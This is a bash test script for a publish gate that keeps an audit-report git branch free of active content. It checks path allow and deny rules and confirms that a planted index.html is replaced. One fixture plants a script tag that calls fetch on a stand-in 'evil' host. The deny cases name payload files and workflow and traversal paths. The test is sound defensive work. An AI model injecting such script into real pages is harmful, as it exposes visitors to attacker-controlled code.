#!/usr/bin/env bash
# Test the publish gate in deploy/container/scripts/entrypoint.sh.
#
# The gate is what lets the publish stage hold a write credential safely: the
# audit stage runs hostile PKGBUILDs and can commit anything to the branch this
# pushes, so "the branch carries only inert data" has to be enforced rather
# than hoped for. That makes it worth a test of its own.
#
# Usage: bash bench/test-publish-gate.sh [-q]
set -euo pipefail

cd "$(dirname "$0")/.."
ENTRYPOINT="deploy/container/scripts/entrypoint.sh"

QUIET=false
[[ "${1:-}" == "-q" ]] && QUIET=true

# Running the entrypoint runs a stage, so lift the gate's functions out of it
# instead of sourcing the whole file. This tests the shipped text, not a copy.
eval "$(sed -n '/^publish_path_allowed()/,/^}/p' "$ENTRYPOINT")"
eval "$(sed -n '/^validate_reports_tree()/,/^}/p' "$ENTRYPOINT")"

log() { $QUIET || echo "      $*"; }

fails=0
ok()   { $QUIET || printf '  ok    %s\n' "$1"; }
bad()  { printf '  FAIL  %s\n' "$1"; fails=$(( fails + 1 )); }

allow() {
    if publish_path_allowed "$1"; then ok "allow  $1"; else bad "should allow: $1"; fi
}
deny() {
    if publish_path_allowed "$1"; then bad "should DENY: $1"; else ok "deny   $1"; fi
}

echo "== paths the branch legitimately carries =="
allow "vivaldi-snapshot/20260821-192601-qwen-qwen3-235b-a22b-2507.md"
allow "r2modman-bin/20260821-204450-judge.json"
allow "lib32-rtmpdump/20260821-194229-deepseek-deepseek-v4-flash.md"
allow "_dashboard/data.json"
allow "_dashboard/pkg/brave-bin.json"
allow "index.html"
allow ".nojekyll"

echo "== active content, which is the whole point =="
deny "evil.html"
deny "brave-bin/evil.html"
deny "brave-bin/payload.js"
deny "brave-bin/icon.svg"
deny "_dashboard/evil.html"
deny "_dashboard/pkg/evil.html"
deny "_dashboard/data.js"
deny "index.htm"

echo "== shapes that are not a report =="
deny "brave-bin/nested/deeper.md"          # only <pkg>/<file>
deny "_dashboard/pkg/nested/x.json"        # only one level under pkg/
deny "_dashboard/nested/data.json"
deny "toplevel.md"                         # a report lives under a package
deny "brave-bin"                           # a bare directory name
deny ""

echo "== dotfiles and traversal =="
deny ".github/workflows/release.yml"
deny "brave-bin/.hidden.md"
deny ".hidden/report.md"
deny "../escape.md"
deny "brave-bin/../../escape.md"

echo "== the tree validator, against real git objects =="
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
repo="$tmp/reports.git"
git init --bare --quiet "$repo"

# Build a tree by plumbing, the same way the pipeline archives reports.
make_commit() {
    local idx="$tmp/index" path blob tree
    rm -f "$idx"
    for path in "$@"; do
        blob="$(printf 'x' | git --git-dir="$repo" hash-object -w --stdin)"
        GIT_INDEX_FILE="$idx" git --git-dir="$repo" update-index --add \
            --cacheinfo "100644,${blob},${path}"
    done
    tree="$(GIT_INDEX_FILE="$idx" git --git-dir="$repo" write-tree)"
    GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
        git --git-dir="$repo" commit-tree "$tree" -m t
}

clean="$(make_commit "brave-bin/20260821-1-m.md" "brave-bin/20260821-1-judge.json" \
                     "_dashboard/data.json" "_dashboard/pkg/brave-bin.json" \
                     "index.html" ".nojekyll")"
if validate_reports_tree "$repo" "$clean" >/dev/null 2>&1; then
    ok "clean tree passes"
else
    bad "clean tree should pass"
fi

dirty="$(make_commit "brave-bin/20260821-1-m.md" "brave-bin/pwned.html")"
if validate_reports_tree "$repo" "$dirty" >/dev/null 2>&1; then
    bad "tree with planted .html should be REFUSED"
else
    ok "tree with planted .html is refused"
fi

deep="$(make_commit "brave-bin/20260821-1-m.md" ".github/workflows/pwn.yml")"
if validate_reports_tree "$repo" "$deep" >/dev/null 2>&1; then
    bad "tree with a workflow file should be REFUSED"
else
    ok "tree with a workflow file is refused"
fi

echo "== index.html is rebuilt, not trusted =="
eval "$(sed -n '/^rewrite_dashboard_html()/,/^}/p' "$ENTRYPOINT")"
# Both are read by rewrite_dashboard_html, which arrives through the eval above,
# so shellcheck cannot see the use.
# shellcheck disable=SC2034
SRC_DIR="$PWD"
# shellcheck disable=SC2034
REPORTS_BRANCH="audit-reports"
trusted="$(python3 bench/generate-dashboard.py --print-html | git hash-object --stdin)"

# A page the audit stage could have planted.
evil_blob="$(printf '<script>fetch("//evil")</script>' | git --git-dir="$repo" hash-object -w --stdin)"
rm -f "$tmp/index"
GIT_INDEX_FILE="$tmp/index" git --git-dir="$repo" update-index --add \
    --cacheinfo "100644,${evil_blob},index.html"
GIT_INDEX_FILE="$tmp/index" git --git-dir="$repo" update-index --add \
    --cacheinfo "100644,${evil_blob},brave-bin/20260821-1-m.md"
evil_tree="$(GIT_INDEX_FILE="$tmp/index" git --git-dir="$repo" write-tree)"
tampered="$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
    git --git-dir="$repo" commit-tree "$evil_tree" -m t)"

fixed="$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
    rewrite_dashboard_html "$repo" "$tampered")"
got="$(git --git-dir="$repo" rev-parse "${fixed}:index.html")"
if [[ "$got" == "$trusted" ]]; then
    ok "planted index.html is replaced by this image's page"
else
    bad "index.html was not replaced (got $got, want $trusted)"
fi
if [[ "$fixed" != "$tampered" ]]; then
    ok "rewriting produced a new commit"
else
    bad "rewriting should have produced a new commit"
fi

# Running again must be a no-op: the page already matches, so there is nothing
# to rewrite and no empty commit to make.
again="$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
    rewrite_dashboard_html "$repo" "$fixed")"
if [[ "$again" == "$fixed" ]]; then
    ok "rewriting is idempotent"
else
    bad "rewriting twice should be a no-op (got $again, want $fixed)"
fi

echo "== the review stage's exit status, which a caller gates on =="
eval "$(sed -n '/^stage_reports_repo()/,/^}/p' "$ENTRYPOINT")"
eval "$(sed -n '/^do_review()/,/^}/p' "$ENTRYPOINT")"

# stage_reports_repo reads refs out of a real store, so build one.
store="$tmp/store.git"
git init --bare --quiet "$store"
mkdir -p "$store/refs/heads" "$store/refs/remotes/origin"
git --git-dir="$repo" rev-parse "$clean" > "$store/refs/heads/audit-reports"
# Point the store's objects at the repo we already populated.
printf '%s\n' "$repo/objects" > "$store/objects/info/alternates"

# Read by stage_reports_repo, which arrives through the eval above.
# shellcheck disable=SC2034
GIT_STORE="$store"
review_status() (
    # A subshell: do_review resolves log/die at call time, and die exits.
    set +e
    do_review --no-llm >/dev/null 2>&1
    echo $?
)

if [[ "$(review_status)" == "0" ]]; then
    ok "clean branch: review exits 0"
else
    bad "clean branch: review should exit 0"
fi

git --git-dir="$repo" rev-parse "$dirty" > "$store/refs/heads/audit-reports"
if [[ "$(review_status)" == "1" ]]; then
    ok "branch with a planted .html: review exits 1"
else
    bad "branch with a planted .html: review should exit 1"
fi

echo
if (( fails > 0 )); then
    echo "FAILED: $fails check(s)"
    exit 1
fi
echo "publish gate: all checks passed"
